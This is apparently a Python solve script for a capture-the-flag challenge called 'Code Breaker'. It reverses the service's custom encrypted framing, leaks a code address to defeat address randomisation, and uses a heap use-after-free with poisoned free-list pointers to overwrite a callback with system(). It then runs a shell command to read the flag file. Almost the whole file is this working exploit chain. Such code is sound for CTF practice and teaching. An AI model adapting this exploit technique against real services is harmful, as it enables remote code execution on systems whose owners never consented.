#!/usr/bin/env python3
"""Solve SunshineCTF 2026 Code Breaker."""

from __future__ import annotations

import argparse
import os
import re
import socket
import sys
from pathlib import Path


SBOX_OFFSET = 0x2040
SBOX_SIZE = 0x100
CALLBACK_RVA = 0x40C0
CALLBACK_STUB_RVA = 0x1390
SYSTEM_PLT_RVA = 0x1150
CHUNK_SIZE = 0x40
FLAG_PATTERN = re.compile(rb"sun\{[^}\r\n]+\}")


class CodeBreaker:
    def __init__(self, sock: socket.socket, sbox: bytes):
        self.sock = sock
        self.sbox = sbox
        self.key = b""
        self.tx_counter = 0
        self.rx_counter = 0

    def recv_exact(self, size: int) -> bytes:
        data = bytearray()
        while len(data) < size:
            part = self.sock.recv(size - len(data))
            if not part:
                raise EOFError("service closed the connection")
            data.extend(part)
        return bytes(data)

    def recv_frame(self) -> bytes:
        size = int.from_bytes(self.recv_exact(2), "big")
        return self.recv_exact(size)

    def send_frame(self, body: bytes) -> None:
        self.sock.sendall(len(body).to_bytes(2, "big") + body)

    def crypt(self, data: bytes, counter: int) -> bytes:
        return bytes(
            value ^ self.sbox[(counter + i + self.key[i & 0x0F]) & 0xFF]
            for i, value in enumerate(data)
        )

    def handshake(self) -> None:
        hello = self.recv_frame()
        if len(hello) != 17 or hello[0] != 1:
            raise RuntimeError(f"unexpected hello frame: {hello.hex()}")
        server_nonce = hello[1:]
        client_nonce = os.urandom(16)
        self.send_frame(b"\x02" + client_nonce)

        state = server_nonce + client_nonce
        key = bytearray(16)
        for round_no in range(4):
            for i in range(16):
                value = state[(i + 8 * round_no) & 0x1F] ^ key[i]
                value = self.sbox[value] ^ state[3 * round_no + i]
                key[i] = ((value << 3) | (value >> 5)) & 0xFF
        self.key = bytes(key)

        check = bytes(
            self.key[(i + 5) & 0x0F] ^ self.sbox[self.key[i]]
            for i in range(16)
        )
        self.send_frame(self.crypt(b"\x03" + check, 0))
        self.tx_counter = 17

        ack = self.recv_frame()
        plain_ack = self.crypt(ack, 0)
        if plain_ack != b"\x04\x00":
            raise RuntimeError(f"handshake failed: {plain_ack.hex()}")
        self.rx_counter = len(ack)

    def request(self, body: bytes) -> bytes:
        encrypted = self.crypt(body, self.tx_counter)
        self.send_frame(encrypted)
        self.tx_counter += len(body)

        response = self.recv_frame()
        plain = self.crypt(response, self.rx_counter)
        self.rx_counter += len(response)
        return plain

    def status(self, body: bytes) -> bytes:
        response = self.request(body)
        if len(response) < 2 or response[0] != body[0] or response[1] != 0:
            raise RuntimeError(
                f"operation {body[0]:02x} failed: {response[:16].hex()}"
            )
        return response

    def fetch_flag(self) -> str:
        info = self.request(b"\x16")
        if len(info) < 10 or info[0] != 0x16:
            raise RuntimeError(f"unexpected info reply: {info[:16].hex()}")
        callback = int.from_bytes(info[2:10], "little")
        pie_base = callback - CALLBACK_STUB_RVA
        callback_slot = pie_base + CALLBACK_RVA
        system_plt = pie_base + SYSTEM_PLT_RVA

        filler = b"A" * CHUNK_SIZE
        self.status(b"\x10\x00\x00\x40" + filler)
        self.status(b"\x14\x01\x00")
        self.status(b"\x13\x01")

        dangling = self.request(b"\x11\x00")
        if len(dangling) < 12 or dangling[:4] != b"\x11\x00\x00\x40":
            raise RuntimeError(f"unexpected read reply: {dangling[:16].hex()}")
        heap_page = int.from_bytes(dangling[4:12], "little")

        self.status(b"\x10\x02\x00\x40" + b"C" * CHUNK_SIZE)
        self.status(b"\x10\x03\x00\x40" + b"D" * CHUNK_SIZE)
        self.status(b"\x13\x03")
        self.status(b"\x13\x02")

        encoded_next = callback_slot ^ heap_page
        update = b"\x12\x00\x00\x10" + encoded_next.to_bytes(8, "little") + b"\x00" * 8
        self.status(update)
        self.status(b"\x10\x04\x00\x40" + b"E" * CHUNK_SIZE)
        self.status(
            b"\x10\x05\x00\x40"
            + system_plt.to_bytes(8, "little")
            + b"\x00" * (CHUNK_SIZE - 8)
        )

        command = b"\x15cat /ctf/flag.txt"
        self.send_frame(self.crypt(command, self.tx_counter))
        self.tx_counter += len(command)

        data = bytearray()
        self.sock.settimeout(2.0)
        while True:
            part = self.sock.recv(4096)
            if not part:
                break
            data.extend(part)
            match = FLAG_PATTERN.search(data)
            if match:
                return match.group().decode("ascii")
        raise RuntimeError(f"flag text not found in service output: {bytes(data)!r}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve Code Breaker")
    parser.add_argument("--host", default="chal.sunshinectf.games")
    parser.add_argument("--port", type=int, default=26005)
    parser.add_argument(
        "--binary",
        type=Path,
        default=Path(__file__).resolve().parent / "challenge" / "code_breaker",
        help="local challenge executable containing the lookup table",
    )
    args = parser.parse_args()

    binary = args.binary.read_bytes()
    sbox = binary[SBOX_OFFSET : SBOX_OFFSET + SBOX_SIZE]
    if len(sbox) != SBOX_SIZE:
        parser.error(f"could not read the lookup table from {args.binary}")

    try:
        with socket.create_connection((args.host, args.port), timeout=5.0) as sock:
            client = CodeBreaker(sock, sbox)
            client.handshake()
            print(client.fetch_flag())
    except (EOFError, OSError, RuntimeError, ValueError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
